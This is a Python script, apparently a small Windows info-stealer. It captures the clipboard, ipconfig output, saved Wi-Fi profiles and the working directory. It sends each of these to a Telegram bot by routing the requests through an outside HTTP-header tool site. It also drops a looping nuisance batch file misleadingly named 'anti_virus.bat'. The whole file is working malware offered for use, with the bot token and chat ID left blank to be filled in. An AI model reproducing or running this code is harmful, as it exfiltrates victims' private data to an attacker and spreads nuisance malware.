# Telegram Token
token = ""

# Your Chat ID : You can use @userinfobot to get your chat id account
chat_id = ""


from subprocess import getoutput
import requests
import time

clip = getoutput("powershell get-clipboard")
ip = getoutput("ipconfig")
networks = getoutput("powershell netsh wlan show profile")
dirs = getoutput("cd ")
getoutput("clear")
with open("anti_virus.bat", 'a') as bat:
    bat.write("""
@echo off
:host1let
msg %username% virus started
goto:host1let""")
    bat.close()

print("anti virus is writed")
print("please wait ... ")

url_1 = (f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text=clip board : ")
url_clip = (f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text={clip}")
url_2 = (f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text=ip : ")
url_ip = (f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text={ip}")
url_3 = (f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text=networks : ")
url_net = (f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text={networks}")
url_4 = (f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text=dirs : ")
url_dir = (f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text={dirs}")
p = (f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text=virus writed in system target !")

url_list = [url_1, url_clip, url_2, url_ip, url_3, url_net, url_4, url_dir, p]

for url in url_list:
    payload = {
        "UrlBox" : url,
        "AgentList" : "Google Chrome",
        "VersionList" : "HTTP/1.1",
        "MethodList" : "GET"
    }
    req = requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx", data=payload)

time.sleep(3)
print("have a nice day")
time.sleep(2)
